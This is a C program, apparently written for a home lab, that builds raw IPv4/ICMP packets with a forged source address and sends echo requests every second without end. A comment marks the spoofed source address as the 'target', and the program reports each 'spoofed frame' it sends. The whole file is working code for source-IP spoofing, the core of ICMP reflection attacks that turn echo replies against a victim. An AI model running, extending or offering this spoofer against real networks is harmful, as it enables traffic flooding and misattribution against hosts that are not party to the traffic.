#include <stdio.h>
#include <stdint.h>
#include <stddef.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>


static uint16_t calculate_checksum(const void *data, size_t len)
{
    const uint8_t *bytes = data;
    uint32_t sum = 0;

    while (len >= 2) {
        sum += ((uint16_t)bytes[0] << 8) | bytes[1];
        bytes += 2;
        len -= 2;
    }

    if (len == 1) {
        sum += (uint16_t)bytes[0] << 8;
    }

    while (sum >> 16) {
        sum = (sum & 0xFFFFU) + (sum >> 16);
    }

    return htons((uint16_t)~sum);
}

int main(void)
{
    /* 1. Create Raw Socket */
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        perror("socket");
        return 1;
    }

    /* 2. Configure manual IP header handling (IP_HDRINCL) */
    int on = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL,
                   &on, sizeof(on)) == -1) {
        perror("setsockopt");
        close(sockfd);
        return 1;
    }

    /* 3. Declare headers and payload */
    struct iphdr ip = {0};
    struct icmphdr icmp = {0};

    const char payload[] = "Hello from my lab :) ";
    size_t payload_size = sizeof(payload) - 1;

    /* Verify strict networking structure sizes under Linux */
    if (sizeof(struct iphdr) != 20 || sizeof(struct icmphdr) != 8) {
        fprintf(stderr, "Unexpected header size\n");
        close(sockfd);
        return 1;
    }

    /* 4. Prepare IPv4 header */
    ip.version = 4;
    ip.ihl = 5;
    ip.ttl = 64;
    ip.protocol = IPPROTO_ICMP;

    /* Set default or lab IP addresses here , the 192.168.56.8 is the target */
    if (inet_pton(AF_INET, "192.168.56.8", &ip.saddr) != 1 ||
        inet_pton(AF_INET, "192.168.56.7", &ip.daddr) != 1) {
        fprintf(stderr, "Invalid IPv4 address\n");
        close(sockfd);
        return 1;
    }

    /* 5. Calculate total packet sizes */
    size_t icmp_size = sizeof(struct icmphdr) + payload_size;
    size_t packet_size = sizeof(struct iphdr) + icmp_size;

     ip.tot_len = htons((uint16_t)packet_size);
    ip.check = 0; 

    /* 6. Prepare ICMP Echo Request header static fields */
    icmp.type = ICMP_ECHO;
    icmp.code = 0;
    icmp.un.echo.id = htons(1);
    
    uint16_t seq_num = 1;

    /* 7. Configure destination address structure for sendto */
    struct sockaddr_in dest_addr = {0};
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_addr.s_addr = ip.daddr;

    /* Allocate continuous memory buffers for assembly */
    uint8_t icmp_message[icmp_size];
    uint8_t packet[packet_size];

    while (1) {
        /* Update sequence number for tracking */
        icmp.un.echo.sequence = htons(seq_num);
        icmp.checksum = 0;

        /* Construct the ICMP block (Header + Payload) */
        memcpy(icmp_message, &icmp, sizeof(struct icmphdr));
        memcpy(icmp_message + sizeof(struct icmphdr), payload, payload_size);

        /* Calculate checksum over the entire ICMP message layout */
        icmp.checksum = calculate_checksum(icmp_message, icmp_size);

        memcpy(icmp_message, &icmp, sizeof(struct icmphdr));

        memcpy(packet, &ip, sizeof(struct iphdr));
        memcpy(packet + sizeof(struct iphdr), icmp_message, icmp_size);

        ssize_t bytes_sent = sendto(
            sockfd,
            packet,
            packet_size,
            0,
            (struct sockaddr *)&dest_addr,
            sizeof(dest_addr)
        );

        if (bytes_sent < 0) {
            perror("sendto");
            close(sockfd);
            return 1;
        }

        if ((size_t)bytes_sent != packet_size) {
            fprintf(stderr, "Unexpected number of bytes sent\n");
            close(sockfd);
            return 1;
        }

        printf("[Packet #%u] Spoofed frame sent successfully (%zd bytes)\n", seq_num, bytes_sent);

        seq_num++;
        sleep(1);
    }

    close(sockfd);
    return 0;
}
